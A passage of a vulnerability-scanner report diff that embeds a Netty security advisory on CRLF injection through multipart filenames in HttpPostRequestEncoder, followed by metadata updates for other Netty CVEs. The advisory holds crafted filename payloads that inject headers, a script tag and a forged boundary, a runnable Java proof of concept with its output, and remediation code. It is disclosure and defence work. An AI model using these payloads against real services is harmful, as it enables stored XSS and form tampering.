`io.netty.handler.codec.http.multipart.MixedFileUpload` — `setFilename()` delegates without validation (line 62)\n\n## 3. Vulnerability Description\n\nNetty's `HttpPostRequestEncoder` constructs multipart HTTP request bodies by directly concatenating user-supplied filenames and field names into `Content-Disposition` MIME headers **without validating or sanitizing CRLF characters** (`\\r\\n`). Since MIME headers are delimited by CRLF, an attacker who controls the filename can inject arbitrary MIME headers into the multipart body part.\n\n### Root Cause\n\nIn `HttpPostRequestEncoder.java`, multiple code paths directly embed `fileUpload.getFilename()` into header strings:\n\n```java\n// Line 674 (attachment mode):\ninternal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + \": \"\n    + HttpHeaderValues.ATTACHMENT + \"; \"\n    + HttpHeaderValues.FILENAME + \"=\\\"\" + fileUpload.getFilename() + \"\\\"\\r\\n\");\n//                                        ^^^^^^^^^^^^^^^^^^^^^^^^ NO VALIDATION\n\n// Lines 686-688 (form-data mode):\ninternal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + \": \" + HttpHeaderValues.FORM_DATA + \"; \"\n    + HttpHeaderValues.NAME + \"=\\\"\" + fileUpload.getName() + \"\\\"; \"\n    + HttpHeaderValues.FILENAME + \"=\\\"\" + fileUpload.getFilename() + \"\\\"\\r\\n\");\n//                                        ^^^^^^^^^^^^^^^^^^^^^^^^ NO VALIDATION\n\n// Line 519 (attribute name):\ninternal.addValue(HttpHeaderNames.CONTENT_DISPOSITION + \": \" + HttpHeaderValues.FORM_DATA + \"; \"\n    + HttpHeaderValues.NAME + \"=\\\"\" + attribute.getName() + \"\\\"\\r\\n\");\n//                                    ^^^^^^^^^^^^^^^^^ NO VALIDATION\n```\n\nThe `setFilename()` method in all `FileUpload` implementations only checks for null:\n\n```java\n// DiskFileUpload.java:77-79\npublic void setFilename(String filename) {\n    this.filename = ObjectUtil.checkNotNull(filename, \"filename\");\n    // NO CRLF VALIDATION\n}\n```\n\n### Comparison with Similar Fixed CVEs\n\nThis vulnerability follows the same pattern as:\n\n| CVE | Component | Fix |\n|-----|-----------|-----|\n| **GHSA-jq43-27x9-3v86** | SmtpRequestEncoder — SMTP command injection | Added CRLF validation in `SmtpUtils.validateSMTPParameters()` |\n| **GHSA-84h7-rjj3-6jx4** | HttpRequestEncoder — CRLF in URI | Added `HttpUtil.validateRequestLineTokens()` |\n\nThe multipart encoder has **no equivalent validation** for filenames or field names.\n\n## 4. Exploitability Prerequisites\n\nThis vulnerability is exploitable when:\n\n1. The application uses Netty's `HttpPostRequestEncoder` to construct multipart HTTP requests\n2. The filename of an uploaded file is derived from user-controlled input\n3. The application does **not** perform its own CRLF sanitization on filenames\n\n**Common affected patterns**:\n- File upload proxies that forward user-supplied filenames\n- API gateways that construct multipart requests from incoming parameters\n- Microservice communication that passes filenames between services\n- Testing/automation frameworks that use Netty HTTP client with user-defined filenames\n\n## 5. Attack Scenarios\n\n### Scenario 1: Content-Type Override via Filename Injection\n\nAn attacker uploads a file with a crafted filename to override the Content-Type of the multipart body part, potentially enabling stored XSS:\n\n```java\nString maliciousFilename = \"photo.jpg\\\"\\r\\nContent-Type: text/html\\r\\n\\r\\n\u003cscript\u003ealert(document.cookie)\u003c/script\u003e\\r\\n--\";\n\nDiskFileUpload upload = new DiskFileUpload(\n    \"avatar\", maliciousFilename, \"image/jpeg\", \"binary\", UTF_8, fileSize);\n```\n\n**Wire format:**\n```\n--boundary\ncontent-disposition: form-data; name=\"avatar\"; filename=\"photo.jpg\"\nContent-Type: text/html                    \u003c-- INJECTED: overrides image/jpeg\n\n\u003cscript\u003ealert(document.cookie)\u003c/script\u003e    \u003c-- INJECTED: XSS payload\n--\"\ncontent-type: image/jpeg                   \u003c-- Original (now ignored by many parsers)\n...\n```\n\nIf the receiving server parses the **first** `Content-Type`, the file is treated as HTML instead of JPEG, enabling XSS when the file is served back.\n\n### Scenario 2: Arbitrary MIME Header Injection\n\n```java\nString filename = \"doc.pdf\\\"\\r\\nX-Custom-Auth: admin-token-12345\\r\\nX-Bypass-Check: true\";\n```\n\nInjects arbitrary headers into the multipart body part that may be processed by downstream middleware or application logic.\n\n### Scenario 3: Multipart Boundary Confusion\n\n```java\nString filename = \"file.txt\\\"\\r\\n\\r\\nmalicious body content\\r\\n--boundary\\r\\nContent-Disposition: form-data; name=\\\"secret\";\n```\n\nBy injecting a new boundary delimiter, the attacker can:\n- Terminate the current body part prematurely\n- Start a new body part with a different field name\n- Override form fields processed by the server\n\n## 6. Proof of Concept\n\n### Full Runnable PoC Source Code (MultipartFilenameInjectionPoC.java)\n\n```java\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.multipart.*;\n\nimport java.io.File;\nimport java.io.FileWriter;\nimport java.nio.charset.StandardCharsets;\n\n/**\n * PoC: HTTP Multipart Content-Disposition Header Injection via Filename\n *\n * Demonstrates that HttpPostRequestEncoder does not validate filenames\n * for CRLF characters, allowing injection of arbitrary MIME headers\n * into multipart form data.\n */\npublic class MultipartFilenameInjectionPoC {\n\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"=== Netty Multipart Filename CRLF Injection PoC ===\\n\");\n\n        testFilenameInjection();\n\n        System.out.println(\"\\n=== PoC Complete ===\");\n    }\n\n    static void testFilenameInjection() throws Exception {\n        System.out.println(\"[TEST 1] Filename CRLF Injection in Content-Disposition\");\n        System.out.println(\"-------------------------------------------------------\");\n\n        // Create a temporary file for upload\n        File tempFile = File.createTempFile(\"test\", \".txt\");\n        tempFile.deleteOnExit();\n        try (FileWriter fw = new FileWriter(tempFile)) {\n            fw.write(\"test content\");\n        }\n\n        // Malicious filename with CRLF to inject Content-Type header\n        String maliciousFilename =\n            \"innocent.txt\\\"\\r\\nContent-Type: text/html\\r\\nX-Injected: true\\r\\n\\r\\n\" +\n            \"\u003cscript\u003ealert(1)\u003c/script\u003e\\r\\n--\";\n\n        HttpRequest request = new DefaultHttpRequest(\n            HttpVersion.HTTP_1_1, HttpMethod.POST, \"/upload\");\n\n        HttpPostRequestEncoder encoder = new HttpPostRequestEncoder(\n                new DefaultHttpDataFactory(false), request, true,\n                StandardCharsets.UTF_8, HttpPostRequestEncoder.EncoderMode.RFC3986);\n\n        DiskFileUpload fileUpload = new DiskFileUpload(\n                \"file\", maliciousFilename, \"application/octet-stream\",\n                \"binary\", StandardCharsets.UTF_8, tempFile.length());\n        fileUpload.setContent(tempFile);\n\n        encoder.addBodyHttpData(fileUpload);\n        encoder.finalizeRequest();\n\n        // Read the encoded multipart body\n        StringBuilder body = new StringBuilder();\n        while (!encoder.isEndOfInput()) {\n            HttpContent chunk = encoder.readChunk(Unpooled.buffer().alloc());\n            if (chunk != null) {\n                body.append(chunk.content().toString(StandardCharsets.UTF_8));\n                chunk.release();\n            }\n        }\n        encoder.cleanFiles();\n\n        String encoded = body.toString();\n        System.out.println(\"Malicious filename: \" +\n            maliciousFilename.replace(\"\\r\", \"\\\\r\").replace(\"\\n\", \"\\\\n\"));\n        System.out.println();\n        System.out.println(\"Encoded multipart body:\");\n        System.out.println(\"---\");\n        for (String line : encoded.split(\"\\n\", -1)) {\n            System.out.println(\"  \" + line.replace(\"\\r\", \"\\\\r\"));\n        }\n        System.out.println(\"---\");\n\n        boolean hasInjectedHeader = encoded.contains(\"X-Injected: true\");\n        boolean hasInjectedScript = encoded.contains(\"\u003cscript\u003e\");\n        System.out.println();\n        System.out.println(\"Injected X-Injected header: \" + hasInjectedHeader);\n        System.out.println(\"Injected script tag: \" + hasInjectedScript);\n        System.out.println(\"VULNERABLE: \" +\n            ((hasInjectedHeader || hasInjectedScript) ?\n                \"YES - MIME header injection!\" : \"NO\"));\n\n        tempFile.delete();\n    }\n}\n```\n\n### How to Compile and Run\n\n```bash\n# Build Netty (skip tests)\n./mvnw install -pl common,buffer,codec,codec-base,codec-http,transport -DskipTests \\\n  -Dcheckstyle.skip=true -Denforcer.skip=true -Djapicmp.skip=true \\\n  -Danimal.sniffer.skip=true -Drevapi.skip=true -Dforbiddenapis.skip=true \\\n  -Dspotbugs.skip=true -q\n\n# Set classpath\nJARS=$(find ~/.m2/repository/io/netty -name \"netty-*.jar\" -path \"*/4.2.12.Final/*\" \\\n  | grep -v sources | grep -v javadoc | tr '\\n' ':')\n\n# Compile and run\njavac -cp \"$JARS\" MultipartFilenameInjectionPoC.java\njava -cp \"$JARS:.\" MultipartFilenameInjectionPoC\n```\n\n### PoC Execution Output (Verified on Netty 4.2.12.Final)\n\n```\n=== Netty Multipart Filename CRLF Injection PoC ===\n\n[TEST 1] Filename CRLF Injection in Content-Disposition\n-------------------------------------------------------\nMalicious filename: innocent.txt\"\\r\\nContent-Type: text/html\\r\\nX-Injected: true\\r\\n\\r\\n\u003cscript\u003ealert(1)\u003c/script\u003e\\r\\n--\n\nEncoded multipart body:\n---\n  --88aaade41dbb9f9f\\r\n  content-disposition: form-data; name=\"file\"; filename=\"innocent.txt\"\\r\n  Content-Type: text/html\\r                          \u003c-- INJECTED\n  X-Injected: true\\r                                 \u003c-- INJECTED\n  \\r\n  \u003cscript\u003ealert(1)\u003c/script\u003e\\r                        \u003c-- INJECTED XSS\n  --\"\\r\n  content-length: 12\\r\n  content-type: application/octet-stream\\r\n  content-transfer-encoding: binary\\r\n  \\r\n  test content\\r\n  --88aaade41dbb9f9f--\\r\n---\n\nInjected X-Injected header: true\nInjected script tag: true\nVULNERABLE: YES - MIME header injection!\n\n\n=== PoC Complete ===\n```\n\n## 7. Impact Analysis\n\n| Impact Category | Description |\n|----------------|-------------|\n| **Confidentiality** | HIGH — Injected headers may bypass access controls or leak tokens |\n| **Integrity** | HIGH — Content-Type override enables stored XSS; field name injection allows form data manipulation |\n| **Content-Type Spoofing** | Override `application/octet-stream` to `text/html` to serve executable content |\n| **Stored XSS** | Inject `\u003cscript\u003e` tags via Content-Type override when uploaded files are served back |\n| **Form Field Override** | Inject new multipart boundaries to create/override form fields |\n| **Downstream Injection** | Custom MIME headers may affect middleware, CDN, or storage layer behavior |\n\n## 8. Remediation Recommendations\n\n### Option 1: Validate in FileUpload.setFilename() (Recommended)\n\n```java\n// DiskFileUpload.java / MemoryFileUpload.java / MixedFileUpload.java\npublic void setFilename(String filename) {\n    ObjectUtil.checkNotNull(filename, \"filename\");\n    for (int i = 0; i \u003c filename.length(); i++) {\n        char c = filename.charAt(i);\n        if (c == '\\r' || c == '\\n') {\n            throw new IllegalArgumentException(\n                \"filename contains prohibited CRLF character at index \" + i);\n        }\n    }\n    this.filename = filename;\n}\n```\n\n### Option 2: Sanitize in HttpPostRequestEncoder (Defense-in-Depth)\n\nEscape or reject CRLF characters when building Content-Disposition headers:\n\n```java\n// HttpPostRequestEncoder.java - add helper method\nprivate static String sanitizeHeaderParam(String value) {\n    for (int i = 0; i \u003c value.length(); i++) {\n        char c = value.charAt(i);\n        if (c == '\\r' || c == '\\n' || c == '\"') {\n            throw new ErrorDataEncoderException(\n                \"Multipart parameter contains prohibited character at index \" + i);\n        }\n    }\n    return value;\n}\n\n// Then use in Content-Disposition construction:\ninternal.addValue(... + \"=\\\"\" + sanitizeHeaderParam(fileUpload.getFilename()) + \"\\\"\\r\\n\");\n```\n\n### Option 3: RFC 2231/5987 Encoding for Filenames\n\nUse proper RFC 2231 encoding for filenames with special characters:\n\n```java\n// Encode filename per RFC 5987:\n// filename*=UTF-8''encoded%20filename\nString encodedFilename = \"UTF-8''\" + URLEncoder.encode(filename, \"UTF-8\");\ninternal.addValue(... + \"filename*=\" + encodedFilename + \"\\r\\n\");\n```\n\n## 9. References\n\n- [RFC 2183: Content-Disposition Header Field](https://tools.ietf.org/html/rfc2183)\n- [RFC 7578: Returning Values from Forms: multipart/form-data](https://tools.ietf.org/html/rfc7578)\n- [RFC 5987: Character Set and Language Encoding for HTTP Header Field Parameters](https://tools.ietf.org/html/rfc5987)\n- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)\n- [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)\n- [GHSA-jq43-27x9-3v86: Netty SMTP Command Injection (same pattern)](https://github.com/netty/netty/security/advisories/GHSA-jq43-27x9-3v86)\n- [GHSA-84h7-rjj3-6jx4: Netty HTTP CRLF Injection (same pattern)](https://github.com/netty/netty/security/advisories/GHSA-84h7-rjj3-6jx4)",
+          "Title": "io.netty/netty-codec-http: Netty: CRLF Injection via Multipart Filename in Netty HttpPostRequestEncoder",
+          "Description": "Netty is an asynchronous, event-driven network application framework. Prior to versions 4.1.136.Final and 4.2.16.Final, HttpPostRequestEncoder constructs multipart HTTP request bodies by directly concatenating user-supplied filenames and field names into Content-Disposition MIME headers without validating or sanitizing CRLF characters (\\r\\n). Since MIME headers are delimited by CRLF, an attacker who controls the filename can inject arbitrary MIME headers into the multipart body part. The root cause is that neither the encoder nor the FileUpload implementations' setFilename() methods, which only check for null, neutralize CRLF characters before the filename is embedded into the header. This issue has been fixed in versions 4.1.136.Final and 4.2.16.Final.",
           "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-93"
+          ],
           "VendorSeverity": {
-            "ghsa": 2
+            "ghsa": 2,
+            "redhat": 2
           },
           "CVSS": {
             "ghsa": {
               "V3Vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
               "V3Score": 5.7
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+              "V3Score": 5.7
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59921",
             "https://github.com/netty/netty",
             "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
             "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
-            "https://github.com/netty/netty/security/advisories/GHSA-gcjf-9mgh-3p7g"
-          ]
+            "https://github.com/netty/netty/security/advisories/GHSA-gcjf-9mgh-3p7g",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59921",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59921"
+          ],
+          "PublishedDate": "2026-07-28T23:17:09.923Z",
+          "LastModifiedDate": "2026-07-28T23:17:09.923Z"
         },
         {
           "VulnerabilityID": "CVE-2025-58056",
@@ -23866,23 +23960,31 @@
             "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"
           },
           "Fingerprint": "sha256:9729870738cebbb55fc9908f47e6f8f2cbd65571bf07834e3a7b33b3e1e2de62",
-          "Title": "Netty: [codec-http2] Lack of Host Header Deduplication in HTTP/2→HTTP/1.x Translation Leads to Request Routing Bypass",
-          "Description": "Netty's HTTP/2-to-HTTP/1.x translation layer (`Http2StreamFrameToHttpObjectCodec` and `InboundHttp2ToHttpAdapter`) fails to deduplicate or validate `Host` headers when an HTTP/2 client supplies both the `:authority` pseudo-header and a literal `host` header in a single HEADERS frame. The translator maps `:authority` to `Host` and separately copies the literal `host` header, producing an `HttpRequest` object containing two `Host` headers with attacker-controlled differing values.",
+          "Title": "io.netty/netty-codec-http2: Netty: Improper header neutralization in netty-codec-http2",
+          "Description": "A flaw was found in Netty's netty-codec-http2 component. The HTTP/2 encoder does not properly handle special characters in HTTP headers. This vulnerability allows a remote attacker to craft specific HTTP/2 requests, leading to HTTP response splitting and header injection attacks. Such attacks can enable an attacker to manipulate web content or inject malicious headers.",
           "Severity": "MEDIUM",
           "VendorSeverity": {
-            "ghsa": 2
+            "ghsa": 2,
+            "redhat": 2
           },
           "CVSS": {
             "ghsa": {
               "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
               "V40Score": 6.9
+            },
+            "redhat": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N",
+              "V3Score": 6.5
             }
           },
           "References": [
+            "https://access.redhat.com/security/cve/CVE-2026-59900",
             "https://github.com/netty/netty",
             "https://github.com/netty/netty/releases/tag/netty-4.1.136.Final",
             "https://github.com/netty/netty/releases/tag/netty-4.2.16.Final",
-            "https://github.com/netty/netty/security/advisories/GHSA-c69g-56f8-xwqj"
+            "https://github.com/netty/netty/security/advisories/GHSA-c69g-56f8-xwqj",
+            "https://nvd.nist.gov/vuln/detail/CVE-2026-59900",
+            "https://www.cve.org/CVERecord?id=CVE-2026-59900"
           ]
         },
         {
@@ -25206,7 +25308,7 @@
             "https://bugzilla.redhat.com/show_bug.cgi?id=2451409",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-67030",
             "https://errata.almalinux.org/9/ALSA-2026-38796.html",
-            "https://errata.rockylinux.org/RLSA-2026:41948",
+            "https://errata.rockylinux.org/RLSA-2026:38500",
             "https://gist.github.com/weaver4VD/3216dac645220f8c9b488362f61241ec",
             "https://github.com/codehaus-plexus/plexus-utils",
             "https://github.com/codehaus-plexus/plexus-utils/commit/6d780b3378829318ba5c2d29547e0012d5b29642",
